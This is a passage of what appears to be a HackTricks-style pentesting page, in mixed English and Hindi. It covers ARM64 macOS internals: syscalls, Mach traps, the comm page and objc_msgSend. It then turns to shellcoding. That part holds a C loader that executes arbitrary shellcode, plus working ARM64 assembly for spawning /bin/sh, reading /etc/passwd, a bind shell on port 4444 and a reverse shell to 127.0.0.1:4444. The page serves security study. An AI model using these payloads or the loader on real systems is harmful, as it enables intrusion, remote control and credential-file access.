- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> कभी-कभी **`libsystem_kernel.dylib`** से मिला हुआ **decompiled** code देखना **source code** की जाँच करने से आसान होता है क्योंकि कई syscalls (BSD और Mach) का code scripts के जरिए generate होता है (source code के comments देखें), जबकि dylib में आप देख सकते हैं कि वास्तव में क्या कॉल हो रहा है।

### machdep calls

XNU एक और प्रकार के कॉल्स को सपोर्ट करता है जिन्हें machine dependent कहा जाता है। इन कॉल्स के नंबर आर्किटेक्चर पर निर्भर करते हैं और न तो कॉल्स और न ही उनके नंबरों की स्थिरता की गारंटी दी जा सकती है।

### comm page

यह एक kernel-owned memory page है जो हर user process के address space में मैप होती है। इसका उद्देश्य user mode से kernel space में transition को तेज बनाना है — उन kernel services के लिए syscalls का उपयोग करने की बजाय, जो इतनी बार उपयोग में आते हैं कि बार-बार syscall करना बहुत inefficient होगा।

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc_msgSend

Objective-C या Swift प्रोग्राम्स में यह function बहुत आम है। यह function किसी Objective-C object के method को कॉल करने की अनुमति देता है।

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> instance का pointer
- x1: op -> method का selector
- x2... -> कॉल किए गए method के बाकी arguments

तो, अगर आप इस function की branch से पहले breakpoint लगाते हैं, तो आप lldb में आसानी से पता लगा सकते हैं कि क्या invoke हो रहा है (इस उदाहरण में ऑब्जेक्ट `NSConcreteTask` के एक object को कॉल कर रहा है जो एक कमांड चलाएगा):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Setting the env variable **`NSObjCMessageLoggingEnabled=1`** से आप लॉग कर सकते हैं जब यह फ़ंक्शन कॉल होता है, एक फ़ाइल जैसे `/tmp/msgSends-pid` में।
>
> इसके अलावा, **`OBJC_HELP=1`** सेट करके और कोई भी binary कॉल करने पर आप अन्य environment variables देख सकते हैं जिनका उपयोग आप certain Objc-C actions के होने पर **लॉग** करने के लिए कर सकते हैं।

When this function is called, it's needed to find the called method of the indicated instance, for this different searches are made:

- Optimistic cache lookup करें:
- यदि सफल हो तो समाप्त।
- runtimeLock (read) प्राप्त करें
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- class की अपनी cache आज़माएँ:
- यदि सफल हो तो समाप्त।
- class method list आज़माएँ:
- यदि मिला तो cache भरें और समाप्त।
- superclass cache आज़माएँ:
- यदि सफल हो तो समाप्त।
- superclass method list आज़माएँ:
- यदि मिला तो cache भरें और समाप्त।
- If (resolver) method resolver आज़माएँ, और class lookup से दोहराएँ
- यदि अभी भी यहाँ हैं (= अन्य सब विफल), तो forwarder आज़माएँ

### Shellcodes

कम्पाइल करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
नए macOS के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code जो shellcode का परीक्षण करता है</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

यह [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) से लिया गया है और समझाया गया है।

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat के साथ पढ़ें

लक्ष्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना, इसलिए दूसरा argument (x1) params की एक array है (जो memory में addresses का stack होता है).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork से sh के साथ command invoke करें ताकि main process killed न हो
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s] से **port 4444** पर
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

स्रोत: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell को **127.0.0.1:4444** पर
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
